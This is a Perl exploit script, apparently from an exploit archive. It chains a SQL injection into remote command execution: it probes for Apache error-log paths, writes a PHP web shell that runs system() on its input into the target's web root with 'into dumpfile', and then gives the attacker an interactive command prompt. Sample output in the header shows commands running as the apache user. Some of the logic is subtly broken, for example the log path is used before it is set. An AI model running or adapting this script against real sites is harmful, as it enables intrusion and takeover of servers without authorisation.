#!/usr/bin/perl

# From SQL Injection to Remote Command Execution via Apache Error logs Exploit
# Coded by Giovanni Buzzin, "Osirys"
# WebSite : www.y-osirys.com
# Contacts :
# me[at]y-osirys[dot]com
# osirys[at]autistici[dot]org

# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
# Usage : perl filename full_website_plus_path vuln_file_plus_SQL (:INJ: instead of printed column)
# ------------------------------------------------------------------ 
#  osirys[~]>$ perl sql_rce.txt http://localhost/test/ /index.php?id=2 and 1=2 union select 1,2,:INJ:,4
#
#  -------------------------------
#        SQL Injection - RCE
#           CMD Inj Sploit
#             by Osirys
#  -------------------------------
#
# [*] Generating error through GET request ..
# [*] Cheeking Apache Error Log path ..
# [*] Error Log path found -> /var/log/httpd/error_log
# [*] Website path found -> /home/osirys/web/test/
# [*] Shell succesfully injected !
# [&] Hi my master, do your job now [!]

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/test
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------------------------------------------|


use IO::Socket;
use LWP::UserAgent;

my $host    = $ARGV[0];
my $sql_inj = $ARGV[1];
my $rand    = int(rand 9) +1;

my @error_logs  =  qw(
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/apache/error.log
                      /var/log/apache/error_log
                      /var/log/apache2/error.log
                      /var/log/apache2/error_log
                      /logs/error.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                    );

my $php_c0de   =  "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET".
                  "[cmd]=stripslashes(\$_GET[cmd]);}system(\$_GET[cmd]);?>";

(($host)&&($sql_inj)) || help("-1");
cheek(1,$host) == 1 || help("-2");
cheek(2,$sql_inj) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

$sql_inj =~ /(.+)\.(.+)\?(.+)=(.+):INJ:(.*)/;
if ($5 !~ //) {
	$lpath = $1.".".$2."?".$3."=".$4."load_file('".$log."')".$5;
	$ipath = $1.".".$2."?".$3."=".$4."'".$php_c0de."'".$5." into dumpfile 'PATH/1337.php'--";
}
else {
	$lpath = $1.".".$2."?".$3."=".$4."load_file('".$log."')";
	$ipath = $1.".".$2."?".$3."=".$4."'".$php_c0de."' into dumpfile 'PATH/1337.php'--";
}

print "[*] Generating error through GET request ..\n";

get_req($host."/osirys_log_test".$rand);

print "[*] Cheeking Apache Error Log path ..\n";

while (($log = <@error_logs>)&&($gotcha != 1)) {
    $tmp_path = $host.$lpath;
    $re = get_req($tmp_path);
    if ($re =~ /File does not exist: (.+)\/osirys_log_test$rand/) {
        $site_path = $1."/";
        $gotcha = 1;
        print "[*] Error Log path found -> $log\n";
        print "[*] Website path found -> $site_path\n";
        &inj_shell;
    }
}

$gotcha == 1 || die "[-] Couldn't file error_log !\n";

sub inj_shell {
	$ipath =~ s/PATH/$site_path/;
    my $attack  = $host.$ipath;
    get_req($attack);
    my $test = get_req($host."/1337.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;

    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host."/1337.php?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.+)0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my($k,$string) = ($_[0],$_[1]);
	if ($k == 1) {
		if ($string =~ /http:\/\/(.+)/) {
			return 1;
		}
		else {
			return 0;
		}
	}
	elsif ($k == 2) {
		if ($string =~ /(.+)\.(.+)\?(.+)=(.+):INJ:(.*)/) {
			return 1;
		}
		else {
			return 0;
		}
	}
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  ------------------------------- \n".
          "        SQL Injection - RCE         \n".
          "           CMD Inj Sploit          \n".
          "             by Osirys             \n".
          "  ------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}